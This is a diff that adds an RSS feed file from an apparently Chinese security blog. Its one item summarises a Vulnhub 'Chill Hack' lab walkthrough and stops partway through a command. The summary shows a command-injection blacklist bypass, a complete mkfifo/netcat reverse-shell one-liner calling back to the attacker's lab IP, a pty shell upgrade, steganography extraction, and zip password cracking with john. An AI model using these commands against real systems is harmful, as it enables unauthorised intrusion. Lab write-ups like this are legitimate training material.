@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>first on gsh3ll</title>
+    <link>http://gsh3ll.top/tags/first/</link>
+    <description>Recent content in first on gsh3ll</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Fri, 18 Dec 2020 09:59:00 +0000</lastBuildDate><atom:link href="http://gsh3ll.top/tags/first/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Vulnhub-chill-hack靶机实战</title>
+      <link>http://gsh3ll.top/posts/vulnhub-chill-hack%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/</link>
+      <pubDate>Fri, 18 Dec 2020 09:59:00 +0000</pubDate>
+      
+      <guid>http://gsh3ll.top/posts/vulnhub-chill-hack%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98/</guid>
+      <description>靶机地址
+  在图像中隐藏秘密消息Steghide Kali Linux隐写术
+  kali利用zip2john爆破压缩包密码
+ 靶机环境 Kali：192.168.108.144
+靶机：192.168.108.178
+主机发现 使用命令netdiscover -r 192.168.108.0/24寻找靶机IP。
+信息收集 使用nmap扫一下目标IP的端口，发现开放了21，22，80端口。
+先看下80端口的Web服务（网页还挺好看:)），点点之后发现，这网页没什么功能。
+使用nikto -host http://192.168.108.178扫描没发现什么漏洞。
+再用dirb进行目录扫描，发现secret/index.php页面。嘿！命令执行窗口？
+漏洞利用 简单输入ls、id等命令后发现，网页对个别命令做了限制，会返回不同的页面。
+使用burpsuite抓到POST数据包，发送到暴破模块，载入linux命令字典进行fuzz，能发现大部分命令可用，可以断定该网页对用户的输入做了黑名单过滤，还注意到python命令也被列入黑名单了，估计后面会用到，并且ifconfig命令下能看到docker网卡。
+经测试发现类似id;ls的命令可以绕过过滤。
+getshell 命令执行页面可以绕过，尝试反弹shell。
+kali使用命令nc -lvp 7777监听7777端口。常见的反弹shell语句在这失效了。所以安利一个小工具：https://weibell.github.io/reverse-shell-generator/
+经过测试命令rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.108.144 7777 &amp;gt;/tmp/f可以反弹shell。
+提权 拿到的是用户www-data的shell，权限很低，所以考虑提权。
+刚刚测试过程中发现靶机是安装有python的，可以通过python进行提权。
+python3 -c &amp;#39;import pty;pty.spwawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; 执行成功。翻看目录发现下面这个图片，应该是ctf里面常见的隐写。
+用python3搭建Web服务器来下载文件。
+python3 -m http.server 8080 kali使用binwalk查看是否隐写了别的文件。
+我人没了，我不会ctf的啊，这咋搞。返回去查看/var/www/files/hacker.php文件，更加确定突破口在上面那张图片里。
+硬着头皮翻资料，发现可以用steghide工具查看图片内的文件。存在backup.zip文件。
+使用steghide分离出zip文件。
+unzip命令提示解压需要密码，遂使用john进行暴破。
+zip2john backup.zip &amp;gt; backup.hash #生成hash文件 john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash #使用john加载字典暴破 john backup.</description>
+    </item>
+    
+  </channel>
+</rss>
